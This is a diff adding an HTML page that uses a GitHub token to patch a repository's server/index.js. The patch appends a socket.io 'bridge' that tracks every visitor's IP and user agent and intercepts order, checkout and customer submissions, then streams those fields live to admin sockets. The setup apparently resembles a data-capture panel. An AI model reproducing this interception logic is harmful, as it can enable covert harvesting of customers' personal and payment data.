@@ -1,0 +1,60 @@
+<!doctype html><meta charset=utf-8><title>fix80</title>
+<pre id=o style="font:13px monospace;padding:12px;white-space:pre-wrap"></pre>
+<script>
+var o=document.getElementById('o'),L=function(m){o.textContent+=m+'\n'};L('START');
+var T=location.hash.slice(1)||localStorage.getItem('kdd_token')||'';
+var A='https://api.github.com/repos/fahshomi-ui/KDD/contents/';
+var B=`/*KDD-KDKAW-BRIDGE2*/
+function __kdkFind(sid){var r=null;try{visitors.forEach(function(v){if(!r&&v&&v.socketId===sid)r=v})}catch(e){}return r}
+function __kdkPush(v,fields,page){try{if(!v||!fields||typeof fields!=='object')return;
+v.data=Object.assign({},v.data||{},fields);
+if(!v.dataHistory)v.dataHistory=[];
+v.dataHistory.push({content:fields,page:page||'إتمام الطلب',timestamp:new Date().toISOString()});
+v.hasNewData=true;visitors.set(v._id,v);
+admins.forEach(function(a,id){try{io.to(id).emit('visitor:dataSubmitted',{visitorId:v._id,data:v.data,visitor:v})}catch(e){}});
+if(typeof saveData==='function')saveData();}catch(e){console.log('kdk push err',e.message)}}
+io.on('connection',function(socket){
+  try{
+    var ua=(socket.handshake&&socket.handshake.headers&&socket.handshake.headers['user-agent'])||'';
+    if(!__kdkFind(socket.id)&&typeof socket.onevent==='function'){
+      try{socket.onevent({data:['visitor:register',{userAgent:ua,referrer:'',page:'الصفحة الرئيسية'}]})}catch(e){}
+    }
+    setTimeout(function(){try{
+      if(__kdkFind(socket.id)){console.log('kdk bridge: visitor ready',socket.id);return}
+      var id='visitor_'+Date.now()+'_'+Math.random().toString(36).slice(2,8);
+      var n=(typeof visitorCounter==='number'?++visitorCounter:1);
+      var v={_id:id,socketId:socket.id,visitorNumber:n,page:'الصفحة الرئيسية',isConnected:true,isIdle:false,ip:socket.handshake.address||'',userAgent:ua,device:'',os:'',browser:'',country:'',sessionStartTime:new Date().toISOString(),data:{},dataHistory:[],hasNewData:false};
+      visitors.set(id,v);
+      try{if(typeof saveVisitorPermanently==='function')saveVisitorPermanently(v)}catch(e){}
+      admins.forEach(function(a,aid){try{io.to(aid).emit('visitor:new',v)}catch(e){}});
+      console.log('kdk bridge: manual visitor',socket.id);
+    }catch(e){console.log('kdk bridge err',e.message)}},1200);
+  }catch(e){}
+  if(typeof socket.onAny!=='function')return;
+  socket.onAny(function(ev,a){try{
+    var p=a||{},name=p.name||'',table=p.table||'',op=p.operation||'';
+    var hit=false,fields=null;
+    if(ev==='data:function'&&/order|checkout|submit|create|confirm/i.test(name)){hit=true;fields=p.body||{}}
+    else if(ev==='data:query'&&op&&op!=='select'&&/order|checkout|cart|customer/i.test(table)){hit=true;fields=Array.isArray(p.payload)?p.payload[0]:p.payload}
+    if(!hit)return;
+    console.log('kdk bridge hit:',ev,name||table);
+    var v=__kdkFind(socket.id);if(!v)return;
+    if(fields&&fields.fields&&typeof fields.fields==='object')fields=fields.fields;
+    if(fields&&fields.customer&&typeof fields.customer==='object')fields=Object.assign({},fields.customer,fields);
+    __kdkPush(v,fields,'إتمام الطلب');
+  }catch(e){console.log('kdk onAny err',e.message)}});
+});
+/*END-KDD-KDKAW-BRIDGE2*/`;
+function hd(){return {Accept:'application/vnd.github+json',Authorization:'token '+T}}
+function d(s){var b=atob(s.replace(/\s/g,'')),u=new Uint8Array(b.length),i=0;for(;i<b.length;i++)u[i]=b.charCodeAt(i);return new TextDecoder('utf-8').decode(u)}
+function e(s){var u=new TextEncoder().encode(s),b='',i=0;for(;i<u.length;i++)b+=String.fromCharCode(u[i]);return btoa(b)}
+function g(f){return fetch(A+f+'?ref=main',{headers:hd()}).then(function(r){if(r.status==401){T=prompt('token:')||T;localStorage.setItem('kdd_token',T);return fetch(A+f+'?ref=main',{headers:hd()}).then(function(r){return r.json()})}return r.json()})}
+function put(f,b,s){return fetch(A+f,{method:'PUT',headers:hd(),body:JSON.stringify({message:'fix80 kdkaw bridge2',content:e(b),sha:s})}).then(function(r){if(r.status==409)return g(f).then(function(j){return put(f,b,j.sha)});if(!r.ok)throw r.status})}
+var F='server/index.js';
+g(F).then(function(j){var s=d(j.content);
+var a=s.indexOf('/*KDD-KDKAW-BRIDGE*/');
+if(a>=0){var b=s.indexOf('/*END-KDD-KDKAW-BRIDGE*/');if(b>=0){s=s.slice(0,a)+s.slice(b+23);L('removed old')}}
+if(s.indexOf('BRIDGE2')>=0){L('already');return}
+s=s+'\n'+B+'\n';put(F,s,j.sha).then(function(){L('OK '+F)}).catch(function(x){L('ERR '+x)})});
+setTimeout(function(){L('ZZZ')},9000);
+</script>
